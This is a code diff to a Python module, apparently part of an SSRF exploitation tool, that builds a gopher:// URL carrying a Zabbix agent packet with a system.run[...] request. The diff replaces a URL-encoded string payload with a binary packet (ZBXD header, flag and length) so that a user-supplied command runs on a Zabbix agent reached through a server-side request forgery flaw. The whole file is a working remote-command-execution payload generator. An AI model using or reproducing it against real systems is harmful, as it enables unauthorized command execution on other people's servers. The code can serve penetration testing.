@@ -1,4 +1,5 @@
-from urllib.parse import quote_plus
+import struct
+from urllib.parse import quote_from_bytes
 
 class Zabbix:
     def __init__(self, subparsers):
@@ -7,11 +8,24 @@ class Zabbix:
         parser.add_argument("-c", "--command", required=True, help="Command")
         parser.set_defaults(run=self.run)
 
-    def encode(self, payload) -> str: 
-        return quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
+    def make_package(self, command: str) -> bytes:
+        protocol_header = "ZBXD" # zabbix protocol header
+        protocol_flags = "\x01" # Flag 0x01: Zabbix communications protocol
+        data = f"system.run[{command}]"
+
+        package = b""
+        package += protocol_header.encode()
+        package += protocol_flags.encode()
+        package += struct.pack("<Q", len(data) + 2)
+        package += data.encode()
+
+        return package
+
+    def encode(self, payload: bytes) -> str: 
+        return quote_from_bytes(payload)
 
     def run(self, args) -> str:
-        payload = f"system.run[({args.command});sleep 2s]"
-        payload_encoded = self.encode(payload)
+        zabbix_package = self.make_package(args.command)
+        payload = self.encode(zabbix_package)
 
-        print(f"gopher://{args.target}/_{payload_encoded}")
+        print(f"gopher://{args.target}/_{payload}")
